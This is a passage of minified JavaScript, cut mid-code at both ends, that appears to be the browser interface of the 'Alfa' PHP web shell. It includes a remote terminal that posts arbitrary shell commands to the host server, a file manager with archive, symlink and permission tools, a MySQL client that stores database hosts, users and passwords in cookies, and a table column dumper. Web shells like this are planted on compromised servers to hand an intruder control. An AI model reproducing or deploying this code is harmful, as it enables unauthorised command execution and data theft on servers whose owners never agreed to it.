time",vals:["DATE","DATETIME","TIMESTAMP","TIME","YEAR"]},{key:"String",vals:["CHAR","VARCHAR","-","TINYTEXT","TEXT","MEDIUMTEXT","LONGTEXT","-","BINARY","VARBINARY","-","TINYBLOB","MEDIUMBLOB","BLOB","LONGBLOB","-","ENUM","SET"]},{key:"Spatial",vals:["GEOMETRY","POINT","LINESTRING","POLYGON","MULTIPOINT","MULTILINESTRING","MULTIPOLYGON","GEOMETRYCOLLECTION"]},{key:"JSON",vals:["JSON"]}],a="",i=!1;for(var l in t)if("object"==typeof t[l]){for(var r in a+='<optgroup label="'+t[l].key+'">',t[l].vals)a+="<option"+(t[l].vals[r]!=e||i?"":" selected")+">"+t[l].vals[r]+"</option>",t[l].vals[r]==e&&(i=!0);a+="</optgroup>"}else a+="<option"+(t[l]!=e||i?"":" selected")+">"+t[l]+"</option>",t[l]==e&&(i=!0);return a}function alfaMysqlChangePage(e,t){var a=e.getAttribute("db_id"),i=0;if(void 0!==t){e=d.querySelector("#"+a+" select[name=mysql-q-pages]");var l=parseInt(e.getAttribute("pages"));if(i=parseInt(e.value),1==t?--i:++i,0==i||l<i)return!1;e.value=i}else i=e.value;var r=e.getAttribute("db_target"),o=e.getAttribute("tbl_name");alfaMysqlApi({db_id:a,db_target:r,ajax_id:"mysql_table_change_page",db_info:{table:o,page:i},post:{alfa2:"page"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function alfaRemoveCookie(e){document.cookie=e+"=;Max-Age=0; path=/;"}function alfaLogOut(){alfaRemoveCookie("AlfaUser"),alfaRemoveCookie("AlfaPass"),location.reload()}var alfaAlertBox=function(e,t){this.types={success:{class:"alert-success",icon:"http://solevisible.com/icons/menu/check-mark1.svg"},error:{class:"alert-error",icon:"http://solevisible.com/icons/menu/warning.svg"}},this.show=function(a){if(""===a||null==a)throw'"msg parameter is empty"';var i=document.querySelector(e),l=document.createElement("DIV"),r=document.createElement("DIV"),o=document.createElement("DIV"),n=document.createElement("A"),s=document.createElement("div"),c=document.createElement("IMG"),d=this;if(s.style.display="inline-block",s.style.marginRight="10px",r.style.display="inline-block",o.classList.add("alert-content"),o.innerText=a,n.classList.add("alert-close"),n.setAttribute("href","#"),l.classList.add("alert-box"),c.src=this.types[t.type].icon,c.style.width="30px",s.appendChild(c),l.appendChild(s),t.hasOwnProperty("title")){var u=document.createElement("DIV");u.classList.add("alert-content-title"),u.innerText=t.title,r.appendChild(u)}if(r.appendChild(o),l.appendChild(r),t.hideCloseButton&&void 0!==t.hideCloseButton||l.appendChild(n),t.hasOwnProperty("type")&&l.classList.add(this.types[t.type].class),i.appendChild(l),n.addEventListener("click",function(e){e.preventDefault(),d.hide(l)}),!t.persistent)var p=setTimeout(function(){d.hide(l),clearTimeout(p)},t.closeTime)},this.hide=function(e){e.classList.add("hide");var t=setTimeout(function(){e.parentNode.removeChild(e),clearTimeout(t)},500)}};function alfaShowNotification(e,t,a,i,l){void 0===a&&(a="success"),void 0===i&&(i=!1),void 0===l&&(l=1e4);var r={closeTime:l,persistent:i,type:a,hideCloseButton:!1};void 0!==t&&(r.title=t),new alfaAlertBox("#alert-area",r).show(e)}function alfaSyncMenuToOpt(e,t){var a="",i="",l=null;void 0!==t?(a="view_archive",i=e,l=location):(a=e.name,i=e.getAttribute("fname"),l=e),"extract"==a?(alfa_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=deziper",g("deziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="DeCompressor"):"compress"==a?(alfa_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=ziper",g("ziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="Compressor"):"view_archive"==a&&(alfa_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=archive_manager",g("archive_manager",null,"",c_+"/"+i,""),d.querySelector(".opt-title").innerHTML="Archive Manager")}function doFilterName(e){var t="#filesman_holder_"+alfa_current_fm_id;setTimeout(function(){var a=new RegExp(e.value,"i");d.querySelectorAll(t+" .fmanager-row").forEach(function(e){-1==e.querySelector(".main_name").getAttribute("fname").search(a)?e.style.display="none":e.style.display="table-row"})},100)}function sortBySelectedValue(e,t){setCookie(t,e.options[e.selectedIndex].value,2012),g("FilesMan",c_)}function loadPopUpDatabase(e,t,a){if($("database_window").style.display="block",void 0===t){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}try{d.querySelector(".sql-tabs .sql-newtab").remove()}catch(e){}var i="id_db_"+getRandom(10);d.querySelector("#database_window .content_options_holder .sql-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="sql-content sql-active-content">'+e+"</div>"),d.querySelector("#database_window .content_options_holder .sql-tabs").insertAdjacentHTML("beforeend",'<div id="tab_'+i+'" opt_id="'+i+'" class="sql-tabname sql-active-tab" onclick="dbTabController(this);"><span style="font-weight:unset;">New DB Connection</span> <img opt_id="'+i+'" onclick="closeDatabase(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div><div class="sql-newtab" onclick="alfa_can_add_opt=true;g(\'sql\',null,\'\',\'\',\'\');" style="background-color:#800000;"><span style="font-weight:unset;">New Tab +</span></div>'),$(i).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",i)});try{$(i).querySelector(".getconfig").setAttribute("base_id",i)}catch(e){}return i}$(t).innerHTML=e;var l=$("tab_"+t);null!=l&&((-1==l.classList.value.indexOf("sql-active-tab")||database_window_is_minimized)&&(l.classList.add("tab-is-done"),alfaShowNotification("proccess is done...","DB: "+l.innerText)),database_window_is_minimized&&alfaUpdateOptionsBadge("database_window")),void 0!==mysql_cache[t]&&mysql_cache[t].hasOwnProperty("db")&&mysql_cache[t].db.length>0&&"update"!=a&&(d.querySelector("#tab_"+t+">span").innerHTML=mysql_cache[t].db),$(t).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",t)});try{$(t).querySelector(".getconfig").setAttribute("base_id",t)}catch(e){}database_window_is_minimized||(d.body.style.overflow="hidden")}function loadPopUpOpTions(e,t){alfa_before_do_action_id="",$("options_window").style.display="block";var a=$("option_"+e);if(alfa_can_add_opt){alfa_can_add_opt=!1;try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var i="",l=$("menu_opt_"+e).innerHTML;"market"==e?l="Alfa Market":"GetDisFunc"==e&&(l="Disable Functions");try{d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}if(null!=a){var r=a.getAttribute("opt_count");null!=r?(i=parseInt(r)+1,a.setAttribute("opt_count",i)):(i=1,a.setAttribute("opt_count",i))}var o="option_"+e+i;d.querySelector("#options_window .content_options_holder .options_content").insertAdjacentHTML("afterbegin",'<div id="'+o+'" class="options_holder">'+t+"</div>"),d.querySelector("#options_window .content_options_holder .options_tab").insertAdjacentHTML("beforeend",'<div opt_id="'+o+'" onclick="optionsTabController(this);" title="'+l+'" id="tab_'+o+'" class="tab_name tab_is_active">'+l+' <img opt_id="'+o+'" onclick="closeOption(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),$(o).classList.toggle("option_is_active"),d.querySelectorAll("#"+o+" form, #"+o+" a").forEach(function(t){if("getconfig"==t.classList.value)return!1;if("FORM"==t.tagName){var a=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'alfaBeforeDoAction("'+e+i+'");'+a),t.setAttribute("opt_id",e+i)}else{a=t.getAttribute("onclick");t.setAttribute("onclick",'alfaBeforeDoAction("'+e+i+'");'+a)}});try{$(o).querySelector(".getconfig").setAttribute("base_id",e+i)}catch(e){}return e+i}a.innerHTML=t;var n=$("tab_option_"+e);null!=n&&((-1==n.classList.value.indexOf("tab_is_active")||options_window_is_minimized)&&(n.classList.add("tab-is-done"),alfaShowNotification("proccess is done...",n.innerText)),options_window_is_minimized&&alfaUpdateOptionsBadge("options_window")),d.querySelectorAll("#option_"+e+" form, #option_"+e+" a").forEach(function(t){if("getconfig"==t.classList.value)return!1;if("FORM"==t.tagName){var a=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'alfaBeforeDoAction("'+e+'");'+a),t.setAttribute("opt_id",e)}else{a=t.getAttribute("onclick");t.setAttribute("onclick",'alfaBeforeDoAction("'+e+'");'+a)}});try{a.querySelector(".getconfig").setAttribute("base_id",e)}catch(e){}options_window_is_minimized||(d.body.style.overflow="hidden")}function alfaBeforeDoAction(e){alfa_before_do_action_id=e}function alfaLoaderOnTop(e){$("a_loader").style.display=e,d.body.style.overflow="block"==e?"hidden":"visible"}function alfaAjaxController(e){var t=e.getAttribute("parent");$("loader_"+t).remove(),"filesman_holder"==t.substr(0,15)&&($(t).style.minHeight="0"),_ALFA_AJAX_.hasOwnProperty(t)&&_ALFA_AJAX_[t].abort()}function closeDatabase(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("sql-active-tab"))if((e=d.querySelectorAll(".sql-tabs .sql-tabname")).length>1){e[0].classList.add("sql-active-tab");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("sql-active-content")}else editorClose("database_window");d.querySelector("div[opt_id="+a+"]").remove()}function closeFmTab(e,t){t.stopPropagation();var a=e.getAttribute("fm_id"),i=$("filesman_tab_"+a);if(-1!=i.classList.value.indexOf("filesman-tab-active")&&(e=d.querySelectorAll("#filesman_tabs .filesman_tab")).length>1){e[0].classList.add("filesman-tab-active");var l=e[0].getAttribute("fm_id"),r="filesman_holder_"+l;if(null!=$(r)){$(r).classList.toggle("filesman-active-content");var o=$("filesman_tab_"+l).getAttribute("path");initDir(o),d.mf.c.value=o,alfa_current_fm_id=l}}i.remove(),$("filesman_holder_"+a).remove(),alfaFilesmanTabHideTitle()}function closeOption(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("tab_is_active"))if((e=d.querySelectorAll(".options_tab .tab_name")).length>1){e[0].classList.add("tab_is_active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("option_is_active")}else editorClose("options_window");d.querySelector("div[opt_id="+a+"]").remove()}function historyPanelController(e){"hidden"==e.getAttribute("mode")?(d.querySelector(".editor-explorer").style.display="block",d.querySelector(".editor-modal").style.marginLeft="20%",e.setAttribute("mode","visible"),e.style.left="19%",e.innerHTML="<<"):(d.querySelector(".editor-explorer").style.display="none",d.querySelector(".editor-modal").style.marginLeft="1%",e.setAttribute("mode","hidden"),e.style.left="0%",e.innerHTML=">>")}function closeTerminalContent(e,t){t.stopPropagation();var a=e.getAttribute("term_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("active-terminal-tab"))&&(e=d.querySelectorAll(".terminal-tabs .terminal-tab")).length>1){e[0].classList.add("active-terminal-tab");var i=e[0].getAttribute("term_id");null!=$(i)&&$(i).classList.toggle("active-terminal-content")}d.querySelector("div[term_id="+a+"]").remove()}function closeEditorContent(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("editor-tab-active"))&&(e=d.querySelectorAll(".editor-tabs .editor-tab-name")).length>1){e[0].classList.add("editor-tab-active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("editor-content-active")}d.querySelector("div[opt_id="+a+"]").remove()}function optionsTabController(e){try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("option_is_active");try{d.querySelector("#options_window .content_options_holder .options_tab \t.tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("tab_is_active"),d.querySelector(".opt-title").innerHTML=e.getAttribute("title"),alfaUpdateOptionsBadge("options_window")}function terminalTabController(e){try{d.querySelector(".terminal-tab.active-terminal-tab").classList.remove("active-terminal-tab")}catch(e){}try{d.querySelector(".terminal-content.active-terminal-content").classList.remove("active-terminal-content")}catch(e){}var t=e.getAttribute("term_id");if(null==t)return!1;$(t).classList.toggle("active-terminal-content"),e.classList.remove("tab-is-done"),e.classList.add("active-terminal-tab"),$(t).querySelector(".php-terminal-input").focus(),alfaUpdateOptionsBadge("cgiloader")}function filesmanTabController(e){try{d.querySelector(".ajaxarea.filesman-active-content").classList.remove("filesman-active-content")}catch(e){}try{d.querySelector(".filesman_tab.filesman-tab-active").classList.remove("filesman-tab-active")}catch(e){}var t=e.getAttribute("fm_id");if(null==t)return!1;alfa_current_fm_id=t,e.classList.add("filesman-tab-active"),e.classList.remove("tab-is-done"),$("filesman_holder_"+t).classList.toggle("filesman-active-content");var a=e.getAttribute("path");initDir(a),d.mf.c.value=a}function dbTabController(e){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("sql-active-content"),e.classList.remove("tab-is-done"),e.classList.add("sql-active-tab"),alfaUpdateOptionsBadge("database_window")}function editorTabController(e,t){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}var a=null;void 0===t?a=e.getAttribute("opt_id"):(a=e,e=$("tab_"+a));var i=editor_files["file_"+a.replace("editor_source_","")];if(void 0!==i&&(d.querySelector(".editor-path").innerHTML=(i.pwd+"/"+i.file).replace(/\/\//g,"/")),null==a)return!1;$(a).classList.toggle("editor-content-active");try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("editor-tab-active"),alfaUpdateOptionsBadge("editor")}function alfaUpdateOptionsBadge(e){var t=d.querySelector("#"+e+"-minimized .options_min_badge");if(null!=t){var a=d.querySelectorAll("#"+e+" .tab-is-done").length;t.innerHTML=a,t.style.visibility=a>0?"visible":"hidden"}}function alfaOpenPhpTerminal(e){if(php_temrinal_using_cgi&&void 0===e)showEditor("cgiloader");else{$("cgiloader").style.display="block",$("cgiloader").style.background="rgba(0, 0, 0, 0.57)",$("cgiframe").style.background="rgba(0, 0, 0, 0.81)",$("cgiframe").style.border="1px solid rgb(30, 86, 115)",$("cgiframe").style.height="90%",$("cgiframe").style.padding="3px",d.querySelector("#cgiloader .opt-title").innerHTML="Terminal";var t="",a="",i="terminal_id_"+getRandom(10);void 0===e&&(t=" active-terminal-content",a=" active-terminal-tab"),d.querySelector("#cgiframe .terminal-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="terminal-content'+t+'"><div class="php-terminal-output"><div><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+'\',1);">+</button><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+"',0);\">-</button><input onchange=\"alfaTerminalChangecolor(this,'"+i+'\');" style="height: 18px;background: #dde2e2;" type="color"></div><pre class="ml1" style="border:unset;height: 90%;"></pre></div><div><form term_id="'+i+'" onSubmit="alfaExecTerminal(this);this.c.value=\'\';return false;" autocomplete="off" style="margin-top: 10px;"><div style="overflow: auto;white-space: nowrap;"><div style="display: inline-block;color:#4fbec3;margin-bottom:5px;margin-right:5px;">CWD:~# </div><div style="display: inline-block;color:#42ec42;" class="php-terminal-current-dir"></div></div><div style="position:relative;"><span style="color: #00ff08;font-size: 25px;">$ </span><input style="padding: 8px;font-size: 20px;width: 67%;border: 1px solid #27979B;padding-right:35px;" onkeyup="alfaWalkInTerminalHistory(this,event,\''+i+'\');" term_id="'+i+'" class="php-terminal-input" type="text" name="c" onfocus="closeHistoryCmd(\'free\',this);" placeholder="ls -la"><button class="button" style="color: #27979B;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;">ExeCute<button term_id="'+i+'" class="button" style="color: #27979B;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;" onClick="alfaExecTerminal(this, 1);return false;">Current Dir</button><div class="cmd-history-holder"><div class="commands-history-header">History</div><span onClick="clearTerminalHistory();" style="border-bottom: 1px solid;margin-bottom: 5px;display: inline-block;padding: 5px;color: #59de69;cursor: pointer;">Clear history</span><div style="overflow: auto;height: 82%;" class="commands-history"></div></div><div term_id="'+i+'" class="cmd-history-icon" mode="" onclick="closeHistoryCmd(this);"><img style="width:27px;" src="http://solevisible.com/icons/menu/time2.svg"></div></form></div></div></div>');try{$("terminal_new_tab").remove()}catch(e){}d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="terminalTabController(this);" term_id="'+i+'" id="tab_'+i+'" class="terminal-tab'+a+'">Terminal <img term_id="'+i+'" onclick="closeTerminalContent(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="alfaOpenPhpTerminal(true);" id="terminal_new_tab" style="background-color:#800000;" class="terminal-tab">New Tab +</div>'),terminal_walk_index[i]={index:0,key:-1},d.querySelector("#"+i+" .php-terminal-input").focus(),d.querySelector("#"+i+" .php-terminal-current-dir").innerHTML=c_,d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Terminal",alfaTerminalSetColorAndSize(i),php_temrinal_using_cgi=!0;var l=alfaGetTerminalHistory();for(var r in l)d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+l[r]+"</div>")}d.body.style.overflow="hidden"}function alfaTerminalSetColorAndSize(e){var t=getCookie("alfa-terminal-color"),a=getCookie("alfa-terminal-fontsize");void 0!==t&&(d.querySelector("#"+e+" pre.ml1").style.color=t),void 0!==a&&(d.querySelector("#"+e+" pre.ml1").style.fontSize=a)}function alfaTerminalChangecolor(e,t){d.querySelector("#"+t+" pre.ml1").style.color=e.value,setCookie("alfa-terminal-color",e.value,2012)}function alfaGetTerminalHistory(e){var t=getCookie("alfa-terminal-history");try{t=JSON.parse(t)}catch(e){t=[]}return void 0!==e&&t.reverse(),t}function changeTerminalFontSize(e,t){var a=d.querySelector("#"+e+" pre.ml1"),i=parseInt(window.getComputedStyle(a,null).getPropertyValue("font-size")),l="";1==t?(l=i+1+"px",a.style.fontSize=l):(l=i-1+"px",a.style.fontSize=l),setCookie("alfa-terminal-fontsize",l,2012)}function alfaWalkInTerminalHistory(e,t,a){var i=t||window.event;if("38"==i.keyCode||"40"==i.keyCode||"37"==i.keyCode||"39"==i.keyCode)switch(i.keyCode){case 38:var l=alfaGetTerminalHistory(!0),r="";0==terminal_walk_index[a].index?(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,void 0!==(r=l[terminal_walk_index[a].index])?(e.value=r,++terminal_walk_index[a].index):(e.value="",terminal_walk_index[a].index=0)):terminal_walk_index[a].index<l.length&&(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,e.value=l[terminal_walk_index[a].index],++terminal_walk_index[a].index),terminal_walk_index[a].key=1;break;case 40:l=alfaGetTerminalHistory(!0);if(terminal_walk_index[a].index>=0)0!=terminal_walk_index[a].index&&(--terminal_walk_index[a].index,1==terminal_walk_index[a].key&&--terminal_walk_index[a].index),void 0!==(r=l[terminal_walk_index[a].index])?e.value=r:(e.value="",terminal_walk_index[a].index=0);terminal_walk_index[a].key=0;break;default:console.log(i.keyCode)}else terminal_walk_index[a].index=0}function clearTerminalHistory(){d.querySelectorAll(".commands-history").forEach(function(e){e.innerHTML=""}),setCookie("alfa-terminal-history","",2012)}function alfaAceToFullscreen(e){var t=e.getAttribute("ace_id");alfa_ace_editors.editor[t].container.requestFullscreen()}function closeHistoryCmd(e,t){if("free"==e){var a=t.getAttribute("term_id");return e=d.querySelector("#"+a+" .cmd-history-icon"),d.querySelector("#"+a+" .cmd-history-holder").style.visibility="hidden",d.querySelector("#"+a+" .cmd-history-holder").style.opacity="0",e.setAttribute("mode","off"),!1}var i=e.getAttribute("mode"),l=(a=e.getAttribute("term_id"),d.querySelector("#"+a+" .cmd-history-holder"));0==i.length||"off"==i?(l.style.visibility="visible",l.style.opacity="1",e.setAttribute("mode","on")):(l.style.visibility="hidden",l.style.opacity="0",e.setAttribute("mode","off"))}function geEvalAceValue(e){var t=e.querySelector(".php-evals-ace").getAttribute("id");return alfa_ace_editors.eval[t].getValue()}function alfaOpenArchive(e){var t=e.getAttribute("path"),a=e.getAttribute("fname"),i=e.getAttribute("base_id");if(".."==a&&"phar://"!=t.substr(0,7))return!1;var l="a="+alfab64("open_archive_dir")+"&c="+alfab64(c_)+"&alfa1="+alfab64(t)+"&alfa2="+alfab64(i)+"&ajax="+alfab64("true");_Ajax(d.URL,l,function(e){if("0"!=e){$("archive_base_"+i).innerHTML=e;var a=$("archive_dir_"+i).getAttribute("archive_name"),l=$("archive_dir_"+i).getAttribute("archive_full"),r="",o="";if(0!=(t=t.split(a)[1]).length){var n=(t=t.split("/")).length-1;for(var s in 0==t[n].length&&t.splice(n,1),t)0!=t.length&&(o+=t[s]+"/",r+='<a base_id="'+i+'" fname="'+t[s]+'" path="'+l+o+'" onclick="alfaOpenArchive(this);">'+t[s]+"/</a>")}d.querySelector("#archive_dir_"+i+" .archive_pwd_holder").innerHTML=r}},!1,"open_archive_dir")}function alfaDeleteConnectToDb(e){d.querySelectorAll(".dbh_"+e).forEach(function(e){e.remove()}),alfaConnectionHistoryUpdate(e)}function alfaConnectToDb(e,t){var a={};try{a=JSON.parse(getCookie("alfa_connection_hist"))}catch(e){}var i=d.querySelector("#"+t+" div.sf");i.querySelector("input[name=sql_host]").value=a[e].host,i.querySelector("input[name=sql_login]").value=a[e].user,i.querySelector("input[name=sql_pass]").value=a[e].pass,(i.querySelector("input[name=sql_base]")?i.querySelector("input[name=sql_base]"):i.querySelector("select[name=sql_base]")).value=a[e].db,i.querySelector("input[name=sql_count]").checked=!0,d.querySelector("#"+t+" div.sf .db-connect-btn").click()}function alfaShowConnectionHistory(e){var t={},a=e.getAttribute("db_id"),i=e.getAttribute("mode");if(rows='<table class="connection-hist-table"><tr><th>*</th><th>Host</th><th>User</th><th>Pass</th><th>Database</th><th>Connect</th><th>Delete</th></tr>',"on"==i){e.setAttribute("mode","off");try{t=JSON.parse(getCookie("alfa_connection_hist"))}catch(e){}var l,r=1;for(l in t){var o=t[l].user+"_"+t[l].db;rows+='<tr class="dbh_'+o+'"><th>'+r+"</th><th>"+t[l].host+"</th><th>"+t[l].user+"</th><th>"+t[l].pass+"</th><th>"+t[l].db+'</th><th><button style="margin: unset;" class="connection-his-btn" onclick=\'alfaConnectToDb("'+o+'","'+a+'");\'>Connect</button></th><th style="text-align: center;"><button style="margin: unset;" class="connection-his-btn connection-delete" onclick=\'alfaDeleteConnectToDb("'+o+"\");'>X</button></th></tr>",r++}rows+="</table"}else e.setAttribute("mode","on"),rows="";d.querySelector("#"+a+" .connection_history_holder").innerHTML=rows}function alfaConnectionHistoryUpdate(e){var t,a={};try{a=JSON.parse(getCookie("alfa_connection_hist"))}catch(e){}for(t in mysql_cache)0!=mysql_cache[t].db.length&&(a[mysql_cache[t].user+"_"+mysql_cache[t].db]=mysql_cache[t]);void 0!==e&&delete a[e],setCookie("alfa_connection_hist",JSON.stringify(a),2012)}function alfaExecTerminal(e,t){var a="";if(0==(a=void 0!==t?"cd "+c_:e.c.value).length)return!1;"l"==a?a="ls -trh --color":"ll"==a&&(a="ls -ltrh --color");var i=e.getAttribute("term_id");alfaloader(i,"block"),closeHistoryCmd("free",e);var l="";"FORM"==e.tagName&&(l=e.querySelector(".php-terminal-current-dir").innerHTML),0==(l=l.trim()).length&&(l=c_);var r="a="+alfab64("terminalExec")+"&c="+alfab64(l)+"&alfa1="+alfab64(a)+"&ajax="+alfab64("true");if(_Ajax(d.URL,r,function(e,t){alfaloader(t,"none");try{var a=$("tab_"+i);null!=a&&((-1==a.classList.value.indexOf("active-terminal-tab")||cgi_is_minimized)&&(a.classList.add("tab-is-done"),alfaShowNotification("proccess is done...",a.innerText)),cgi_is_minimized&&alfaUpdateOptionsBadge("cgiloader"))}catch(e){}e=JSON.parse(e),d.querySelector("#"+t+" .php-terminal-output > pre").innerHTML=e.output,0!=e.path.length&&(d.querySelector("#"+t+" .php-terminal-current-dir").innerHTML=e.path)},!1,i),void 0===t){d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+a+"</div>");var o=alfaGetTerminalHistory(),n=o.indexOf(a);-1!=n&&o.splice(n,1),o.push(a),setCookie("alfa-terminal-history",JSON.stringify(o),2012)}d.querySelector("#"+i+" input.php-terminal-input").focus()}function pageChangedFilesMan(e){var t="filesman_holder_"+alfa_current_fm_id,a=getCookie(t+"_page_number"),i=e.innerText;if("<<"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;if(!((a=parseInt(a))>1))return!1;i=a-1}if(">>"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;a=parseInt(a);var l=d.querySelector("#"+t+" .last-page-number").innerHTML;if(!(a+1<=(l=parseInt(l))))return!1;i=a+1}setCookie(t+"_page_number",i,2012),g("FilesMan",c_)}function alfaColDumperInit(){var e=d.querySelector(".tab_name.tab_is_active").getAttribute("opt_id"),t=d.querySelector("#"+e),a=t.getElementsByClassName("box");for(i=0;i<a.length;i++)a[i].addEventListener("click",function(){null!=this.parentElement.querySelector(".nested")&&(this.parentElement.querySelector(".nested").classList.toggle("active"),this.classList.toggle("check-box"))});var i;a=t.getElementsByClassName("sub-box");for(i=0;i<a.length;i++)a[i].setAttribute("opt_id",e),a[i].addEventListener("click",function(){this.classList.toggle("check-box");var e=this.getAttribute("tbl"),t=this.getAttribute("opt_id");t=t.replace("option_",""),col_dumper_selected_data.hasOwnProperty(t)||(col_dumper_selected_data[t]={}),void 0===col_dumper_selected_data[t][e]&&(col_dumper_selected_data[t][e]=[]);var a=this.innerHTML,i=col_dumper_selected_data[t][e].indexOf(a);-1==i?col_dumper_selected_data[t][e].push(a):col_dumper_selected_data[t][e].splice(i,1)})}function showSymlinkPath(e,t){t.stopPropagation();var a=e.getAttribute("row"),i=$("td_row_"+a),l=e.getAttribute("opt_title"),r=e.getAttribute("fname");if(l=decodeURIComponent(r)+" -> "+l,null!=i){i.insertAdjacentHTML("afterbegin",'<div class="symlink_path" id="link_id_'+a+'">'+l+"</div>");var o=t.clientX,n=t.clientY-30;$("link_id_"+a).style.left=o+"px",$("link_id_"+a).style.top=n+"px"}}function hideSymlinkPath(e,t){t.stopPropagation(),$("link_id_"+e.getAttribute("row")).remove()}function alfagetFlags(){data="a="+alfab64("get_flags")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),_Ajax(d.URL,data,function(e){var t=JSON.parse(e);t.hasOwnProperty("server")&&(d.querySelectorAll(".flag-holder")[0].innerHTML='<img draggable="false" title="'+t.server.name+'" src="http://solevisible.com/images/flags/48/'+t.server.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[0].style.display="inline"),t.hasOwnProperty("client")&&(d.querySelectorAll(".flag-holder")[1].innerHTML='<img draggable="false" title="'+t.client.name+'" src="http://solevisible.com/images/flags/48/'+t.client.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[1].style.display="inline")})}function colDumplerSelectType(e){var t=e.options[e.selectedIndex].value;$("coldumper-delimiter-input").style.display="delimiter"==t?"inline-block":"none"}function alfaCheckUrlHash(){var e=window.location.hash.substr(1),t=e.split("&").reduce(function(e,t){var a=t.split("=");return e[a[0]]=a[1],e},{});if(""!=e)switch(t.action){case"fileman":case"options":t.path=decodeURIComponent(t.path),g("FilesMan",t.path,function(e){if(t.hasOwnProperty("file")){var a="auto";isArchive(t.file)&&(a="view"),editor(t.path+"/"+t.file,a,"","","","file")}}),"options"==t.action&&t.hasOwnProperty("opt")&&(alfa_can_add_opt=!0,g(t.opt,null,"","",""),d.querySelector(".opt-title").innerHTML=$("menu_opt_"+t.opt).innerHTML),t.hasOwnProperty("file")||editorClose("editor"),t.hasOwnProperty("opt")||editorClose("options_window"),editorClose("cgiloader");break;default:g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}else g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}function alfaFmngrContextRow(){d.querySelectorAll(".fmanager-row a.main_name").forEach(function(e){e.addEventListener("contextmenu",function(e){var t=e.target,a="";if(".."==(a="A"==e.target.parentElement.tagName?(t=e.target.parentElement).getAttribute("fname"):t.getAttribute("fname")))return!1;var i=t.getAttribute("id"),l=t.getAttribute("path"),r=t.getAttribute("ftype"),o=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete"];for(var n in"file"!=r||isArchive(a)?o[3]="view_archive":o.splice(11,1),"folder"==r&&(o=["newtab","link","move","copy","rename","modify","permission","compress","delete"]),alfaSortMenuItems(o),o){var s=d.querySelector("#rightclick_menu > a[name="+o[n]+"]");switch(s.setAttribute("fid",i),s.setAttribute("fname",decodeURIComponent(a)),s.setAttribute("path",l),s.setAttribute("ftype",r),o[n]){case"view":case"edit":var c="auto";"edit"==o[n]&&(c="edit"),s.setAttribute("href","#action=fileman&path="+c_+"/&file="+a),s.setAttribute("onclick","editor('"+a+"','"+c+"','','','','file')");break;case"newtab":var 